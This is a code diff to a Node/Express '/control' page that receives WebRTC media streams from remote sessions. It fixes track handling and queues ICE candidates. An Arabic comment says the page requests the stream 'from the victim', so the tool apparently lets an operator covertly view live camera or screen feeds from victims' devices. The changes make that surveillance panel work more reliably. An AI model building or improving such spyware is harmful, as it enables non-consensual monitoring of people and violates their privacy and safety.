@@ -265,8 +265,11 @@ app.get('/control', (req, res) => {
           if (event.streams && event.streams[0]) {
             v.srcObject = event.streams[0];
             remoteStreams[sid] = event.streams[0];
-            addLog('📡 Stream received from ' + sid);
+          } else {
+            v.srcObject = new MediaStream([event.track]);
+            remoteStreams[sid] = v.srcObject;
           }
+          addLog('📡 Track received (' + event.track.kind + ') from ' + sid);
         };
 
         pc.onicecandidate = function(event) {
@@ -276,6 +279,7 @@ app.get('/control', (req, res) => {
         };
 
         pc.oniceconnectionstatechange = function() {
+          addLog('⚡ ICE State ' + sid + ': ' + pc.iceConnectionState);
           if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
             addLog('🔴 Session ' + sid + ' disconnected');
             if (card.parentNode) card.remove();
@@ -287,16 +291,28 @@ app.get('/control', (req, res) => {
         // طلب البث من الضحية
         socket.emit('request-stream', { target: sid });
 
+        let hasRemoteDesc = false;
+        let iceQueue = [];
+
         socket.on('video-offer-' + sid, function(offer) {
           pc.setRemoteDescription(new RTCSessionDescription(offer))
+            .then(() => {
+              hasRemoteDesc = true;
+              iceQueue.forEach(c => pc.addIceCandidate(new RTCIceCandidate(c)).catch(e=>console.error(e)));
+              iceQueue = [];
+            })
             .then(() => pc.createAnswer())
             .then(answer => pc.setLocalDescription(answer))
             .then(() => socket.emit('video-answer', { target: sid, answer: pc.localDescription }))
-            .catch(e => console.log(e));
+            .catch(e => console.log('Offer error:', e));
         });
 
         socket.on('ice-candidate-' + sid, function(candidate) {
-          pc.addIceCandidate(new RTCIceCandidate(candidate));
+          if (hasRemoteDesc) {
+            pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(e=>console.error(e));
+          } else {
+            iceQueue.push(candidate);
+          }
         });
       });
     });
